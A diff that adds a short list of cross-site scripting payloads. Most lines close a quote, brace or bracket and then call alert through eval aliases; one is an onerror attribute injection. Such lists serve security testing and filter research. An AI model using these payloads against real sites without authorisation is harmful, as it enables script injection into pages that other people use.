@@ -1,0 +1,11 @@
+alert(1)
+A=alert;A(1)
++alert(0)+
+';//%0da=eval;b=alert;a(b(9));//
+a=1;a=eval;b=alert;a(b(11));//
+'};a=eval;b=alert;a(b(13));//
+1};a=eval;b=alert;a(b(14));//
+'];a=eval;b=alert;a(b(15));//
+1];a=eval;b=alert;a(b(17));//
+1;a=eval;b=alert;a(b(/c/.source));
+xyz onerror=alert(6);
